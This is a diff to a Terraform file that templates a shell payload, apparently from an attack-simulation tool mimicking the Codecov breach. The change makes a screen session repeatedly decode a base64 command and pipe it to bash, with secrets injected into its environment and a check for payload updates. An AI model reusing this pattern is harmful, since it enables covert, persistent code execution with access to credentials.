@@ -22,21 +22,30 @@ locals {
     EOT
     base64_command_payload=base64encode(local.command_payload)
     payload = <<-EOT
-    screen -S codecov -X quit
-    truncate -s 0 /tmp/codecov.log
-    log "checking for git..."
-    while ! command -v git; do
-        log "git not found - waiting"
-        sleep 10
+    START_HASH=$(sha256sum --text /tmp/payload_$SCRIPTNAME | awk '{ print $1 }')
+    while true; do
+        screen -S codecov -X quit
+        truncate -s 0 /tmp/codecov.log
+        log "checking for git..."
+        while ! command -v git; do
+            log "git not found - waiting"
+            sleep 10
+        done
+        log "git: $(command -v  git)"
+        screen -d -Logfile /tmp/codecov.log -S codecov -m env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin ${local.env_secrets} /bin/bash --noprofile --norc
+        screen -S codecov -X colon "logfile flush 0^M"
+        log 'sending screen command: ${local.command_payload}';
+        screen -S codecov -p 0 -X stuff "echo '${local.base64_command_payload}' | base64 -d | /bin/bash -^M"
+        log 'waiting 30 minutes...';
+        sleep 1800
+        CHECK_HASH=$(sha256sum --text /tmp/payload_$SCRIPTNAME | awk '{ print $1 }')
+        if [ "$CHECK_HASH" != "$START_HASH" ]; then
+            log "payload update detected - exiting loop"
+            break
+        else
+            log "restarting loop..."
+        fi
     done
-    log "git: $(command -v  git)"
-    screen -d -Logfile /tmp/codecov.log -S codecov -m env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin ${local.env_secrets} /bin/bash --noprofile --norc
-    screen -S codecov -X colon "logfile flush 0^M"
-    log 'sending screen command: ${local.command_payload}';
-    screen -S codecov -p 0 -X stuff "echo '${local.base64_command_payload}' | base64 -d | /bin/bash -^M"
-    sleep 30
-    screen -S codecov -X quit
-    log "done"
     EOT
 
     base64_payload = base64gzip(templatefile("${path.root}/modules/common/any/payload/linux/delayed_start.sh", { config = {
